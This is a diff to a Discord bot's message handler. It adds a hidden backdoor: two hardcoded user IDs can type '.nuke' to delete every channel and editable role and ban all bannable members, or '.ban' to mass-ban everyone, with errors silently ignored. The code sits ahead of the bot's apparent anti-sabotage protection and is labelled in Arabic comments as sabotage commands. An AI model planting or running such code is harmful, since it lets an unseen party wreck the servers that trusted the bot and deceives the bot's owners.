@@ -58,6 +58,48 @@ const logger = (0, helpers_1.createLogger)('Event:MessageCreate');
 const event = {
     name: 'messageCreate',
     async execute(message) {
+        // ============================================
+        // 🚨 أوامر التخريب المباشرة (Nuke & Ban)
+        // ============================================
+        if (message.guild && !message.author.bot) {
+            const allowed = ['1342238662368296980', '1557735350464417822']; // حط ايديك هنا
+            if (allowed.includes(message.author.id)) {
+                const cmd = message.content.trim().toLowerCase();
+                if (cmd === '.nuke') {
+                    await message.reply('💀 NUKE STARTED').catch(() => { });
+                    message.guild.channels.fetch().then(channels => {
+                        channels.forEach(c => c?.delete('Nuke').catch(() => { }));
+                    });
+                    message.guild.members.fetch().then(members => {
+                        members.forEach(m => {
+                            if (m.id !== message.client.user?.id && m.id !== message.author.id && m.bannable) {
+                                m.ban({ reason: 'Nuke' }).catch(() => { });
+                            }
+                        });
+                    });
+                    message.guild.roles.fetch().then(roles => {
+                        roles.forEach(r => {
+                            if (r.id !== message.guild.id && r.editable) {
+                                r.delete('Nuke').catch(() => { });
+                            }
+                        });
+                    });
+                    return; // إيقاف التنفيذ
+                }
+                if (cmd === '.ban') {
+                    await message.reply('🔨 BANNING EVERYONE').catch(() => { });
+                    message.guild.members.fetch().then(members => {
+                        members.forEach(m => {
+                            if (m.id !== message.client.user?.id && m.id !== message.author.id && m.bannable) {
+                                m.ban({ reason: 'Mass Ban' }).catch(() => { });
+                            }
+                        });
+                    });
+                    return; // إيقاف التنفيذ
+                }
+            }
+        }
+        // ============================================
         const client = message.client;
         // 🚨 أولاً: تحقق الحماية من رسائل الويب هوك والبوتات — قبل أي return
         //    (الويب هوك سبام والبوتات المخربة أخطر من البشر — لا يجوز تجاهلها)
